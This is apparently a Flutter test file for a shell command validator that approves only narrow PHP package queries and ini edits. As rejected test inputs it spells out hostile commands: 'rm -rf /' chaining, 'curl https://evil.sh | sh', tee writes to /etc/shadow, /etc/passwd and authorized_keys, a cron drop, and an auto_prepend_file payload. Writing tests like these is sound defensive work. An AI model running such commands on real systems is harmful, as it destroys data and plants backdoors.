import 'package:flutter_test/flutter_test.dart';
import 'package:dev_stack/features/apps/data/package_command_validator.dart';

void main() {
  group('PackageCommandValidator', () {
    group('package installation is not supported', () {
      for (final command in [
        'sudo apt-get update',
        'apt install -y php8.5-curl',
        'apt-get install -y php8.5-curl',
        'dpkg -i /tmp/keyring.deb',
        'sudo add-apt-repository -y ppa:ondrej/php',
        'apt-key add /tmp/key',
        'dnf install -y php-pdo',
        'dnf module enable -y php:remi-8.4',
        'yum install -y php-pdo',
        'rpm -i /tmp/php.rpm',
        'pacman -S --noconfirm php-gd',
        'pacman -Fy',
        'curl -o /tmp/payload https://example.invalid/payload',
        'wget https://example.invalid/payload',
        'gpg --dearmor /tmp/key',
        'mkdir /etc/php.d/new',
        'touch /etc/php.d/new.ini',
        'chmod 777 /etc/php.d/new.ini',
        'chown root /etc/php.d/new.ini',
        'ln -s /tmp/evil /etc/php.d/new.ini',
        'systemctl disable --now php-fpm',
        'echo "deb https://example.invalid stable main" | tee /etc/apt/sources.list.d/php.list',
      ]) {
        test('rejects $command', () {
          expect(PackageCommandValidator.validate(command), isNotNull);
        });
      }
    });

    group('extension management binaries', () {
      test('accepts read-only discovery commands', () {
        expect(
          PackageCommandValidator.validate(
            'apt-cache search --names-only php8.5-',
          ),
          isNull,
        );
        expect(
          PackageCommandValidator.validate('apt-file list -x ^php8\\.5-'),
          isNull,
        );
        expect(PackageCommandValidator.validate('pacman -Ss php-'), isNull);
        expect(PackageCommandValidator.validate('pacman -Fl php-gd'), isNull);
        expect(
          PackageCommandValidator.validate(
            "dnf repoquery --qf '[%{=NAME}\\n]' 'php-*'",
          ),
          isNull,
        );
      });

      test('accepts the RHEL annotated file list query format', () {
        // The separator is a space, never a pipe: the validator splits every
        // command on '|' to validate pipeline segments separately.
        expect(
          PackageCommandValidator.validate(
            "dnf repoquery -l --qf '[%{=NAME} %{FILENAMES}\\n]' 'php-*'",
          ),
          isNull,
        );
      });

      test('rejects a query format that smuggles in a pipe', () {
        expect(
          PackageCommandValidator.validate(
            "dnf repoquery -l --qf '[%{=NAME}|%{FILENAMES}\\n]' 'php-*'",
          ),
          isNotNull,
        );
      });

      test('accepts Debian module enable/disable commands', () {
        expect(
          PackageCommandValidator.validate('phpenmod -v 8.5 -s fpm mbstring'),
          isNull,
        );
        expect(
          PackageCommandValidator.validate('phpdismod -v 8.5 -s fpm mbstring'),
          isNull,
        );
      });

      test('accepts the manager writing an ini line into the PHP scan dir', () {
        // The enable/disable step on RHEL and Arch pipes one ini line into
        // <scanDir>/99-ponta-<ext>.ini. `echo` and `tee` are already on the
        // allowlist; the target regex is what keeps this narrow.
        expect(
          PackageCommandValidator.validate(
            "echo 'extension=redis' | tee /etc/php.d/99-ponta-redis.ini",
          ),
          isNull,
        );
        expect(
          PackageCommandValidator.validate(
            "echo 'opcache.enable=0' | tee /etc/php/conf.d/99-ponta-opcache.ini",
          ),
          isNull,
        );
        expect(
          PackageCommandValidator.validate(
            "echo 'zend_extension=xdebug' | tee /etc/php/8.5/fpm/conf.d/99-ponta-xdebug.ini",
          ),
          isNull,
        );
        expect(
          PackageCommandValidator.validate(
            "echo 'extension=redis' | tee /etc/opt/remi/php85/php.d/99-ponta-redis.ini",
          ),
          isNull,
        );
      });

      test('rejects the disable comment line, which carries a semicolon', () {
        // The disable path never writes a comment — it rewrites the ini in
        // place with `sed` (Task 8). If it ever tried to `echo '; disabled…'`
        // the validator would reject it outright: `;` is a forbidden
        // substring, because it chains commands. Pinned here so nobody
        // "fixes" a failing disable test by reintroducing that line.
        expect(
          PackageCommandValidator.validate(
            "echo '; disabled by Ponta' | tee /etc/php/8.5/fpm/conf.d/99-ponta-redis.ini",
          ),
          contains('Forbidden pattern'),
        );
      });

      test('still rejects a tee write outside the allowed targets', () {
        // Widening tee for the PHP ini dirs must not turn it into a
        // write-anywhere primitive for catalog commands.
        expect(
          PackageCommandValidator.validate("echo 'x' | tee /etc/passwd"),
          contains('not allowed'),
        );
        expect(
          PackageCommandValidator.validate(
            "echo 'x' | tee /root/.ssh/authorized_keys",
          ),
          contains('not allowed'),
        );
        expect(
          PackageCommandValidator.validate(
            "echo 'x' | tee /etc/php.d/../../shadow",
          ),
          contains('not allowed'),
        );
      });

      test('still rejects chaining smuggled through the new binaries', () {
        expect(
          PackageCommandValidator.validate(
            'phpenmod -v 8.5 -s fpm mbstring; rm -rf /',
          ),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('pacman -Ss php- && rm -rf /'),
          contains('Forbidden pattern'),
        );
      });
    });

    group('rejected commands (negative cases)', () {
      test('rejects unknown leading binary', () {
        expect(
          PackageCommandValidator.validate('evil-binary --arg'),
          contains('not in the allowed list'),
        );
      });

      test('rejects arbitrary binaries smuggled after sudo', () {
        expect(
          PackageCommandValidator.validate('sudo /tmp/payload.sh'),
          anyOf(
            contains('not in the allowed list'),
            contains('not in the allowed system directories'),
          ),
        );
      });

      test('rejects command substitution', () {
        expect(
          PackageCommandValidator.validate(r'echo $(whoami)'),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('echo `whoami`'),
          contains('Forbidden pattern'),
        );
      });

      test('rejects chained commands', () {
        expect(
          PackageCommandValidator.validate('apt-get update; rm -rf /'),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('apt-get update && rm -rf /'),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('true || curl evil.sh'),
          contains('Forbidden pattern'),
        );
      });

      test('rejects file redirection that could overwrite system files', () {
        expect(
          PackageCommandValidator.validate('echo x > /etc/passwd'),
          contains('Forbidden pattern'),
        );
      });

      test('rejects piped shell execution (curl | sh)', () {
        // 'sh' is not in the allowlist, so the second pipeline segment fails
        expect(
          PackageCommandValidator.validate('curl https://evil.sh | sh'),
          contains('not in the allowed list'),
        );
      });

      test('rejects empty command and empty pipeline segment', () {
        expect(PackageCommandValidator.validate(''), isNotNull);
        expect(PackageCommandValidator.validate('  '), isNotNull);
        expect(PackageCommandValidator.validate('apt-get update |'), isNotNull);
      });

      test('rejects tee targeting sensitive system files', () {
        expect(
          PackageCommandValidator.validate(
            'echo evil | sudo tee /etc/cron.d/evil',
          ),
          contains('not allowed'),
        );
        expect(
          PackageCommandValidator.validate('echo evil | tee /etc/shadow'),
          contains('not allowed'),
        );
        expect(
          PackageCommandValidator.validate('echo evil | tee /etc/passwd'),
          contains('not allowed'),
        );
      });

      test('rejects dangerous paths smuggled as binaries', () {
        expect(
          PackageCommandValidator.validate('/tmp/evil_tool'),
          anyOf(
            contains('not in the allowed list'),
            contains('not in the allowed system directories'),
          ),
        );
        expect(
          PackageCommandValidator.validate('sudo /tmp/evil_tool'),
          anyOf(
            contains('not in the allowed list'),
            contains('not in the allowed system directories'),
          ),
        );
      });
    });

    group('narrow PHP configuration syntax', () {
      test('accepts the manager comment-only sed expression', () {
        expect(
          PackageCommandValidator.validate(
            r'''sed -E -i 's,^\s*(zend_)?extension\s*=\s*"?(.*/)?redis(\.so)?"?\s*$,\x3b&,' '/etc/php.d/20-redis.ini' ''',
          ),
          isNull,
        );
        expect(
          PackageCommandValidator.validate(
            r"sed -E -i 's,^\s*opcache\.enable\s*=.*$,\x3b&,' '/etc/opt/remi/php85/php.d/10-opcache.ini'",
          ),
          isNull,
        );
      });
      for (final command in [
        'phpenmod -v 8.5 -s fpm curl &',
        'phpenmod -v 8.5 -s fpm curl # ignored',
        'phpenmod -v 8.5 -s fpm "curl"',
        'phpenmod -v 8.5 -s fpm curl --help',
        '/usr/bin/../local/bin/phpenmod -v 8.5 -s fpm curl',
        "echo 'extension=redis' | tee /etc/php.d/x.ini /etc/shadow",
        "echo 'extension=redis' | tee -a /etc/php.d/99-ponta-redis.ini",
        "echo 'extension=redis' | tee /etc/php.d/20-redis.ini",
        "echo 'auto_prepend_file=/tmp/payload' | tee /etc/php.d/99-ponta-redis.ini",
        "echo 'extension=redis' | tee /etc/php.d/99-ponta-curl.ini",
        "sed -i 's,.*,owned,' /etc/shadow",
        "sed -i 's,.*,owned,' /etc/php.d/20-redis.ini",
        r"sed -E -i 's,^\s*opcache\.enable\s*=.*$,\x3b&,' '/etc/shadow'",
        r"sed -E -i 's,^\s*opcache\.enable\s*=.*$,\x3b&,' '/etc/php.d/../../shadow.ini'",
        r"sed -E -i 's,^\s*opcache\.enable\s*=.*$,\x3b&,' '/etc/php.d/x.ini' -e 's,.*,x,w /tmp/p'",
        "apt-cache search php | tee /etc/php.d/99-ponta-redis.ini",
        "sudo dnf repoquery php-*",
      ]) {
        test('rejects unsafe configuration: $command', () {
          expect(PackageCommandValidator.validate(command), isNotNull);
        });
      }
    });
  });
}
